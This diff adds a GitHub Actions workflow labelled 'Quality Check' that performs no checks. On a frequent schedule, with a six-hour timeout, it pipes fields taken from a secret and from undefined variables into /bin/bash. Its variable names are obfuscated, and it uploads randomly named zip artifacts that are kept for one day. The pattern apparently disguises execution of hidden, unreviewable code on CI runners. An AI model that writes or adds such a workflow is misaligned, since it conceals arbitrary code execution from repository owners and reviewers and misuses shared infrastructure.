@@ -1,0 +1,35 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          a8: ${{ secrets.a8 }}
+        run: |
+          printf '%s' "$a8" | jq -r .wv63874 | /bin/bash
+          printf '%s' "$jw0900" | jq -r .wxdjn27 | /bin/bash
+          printf '%s' "$vkl01" | jq -r .vg1106 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: h94JSJxp
+          path: "*.zip"
+          retention-days: 1
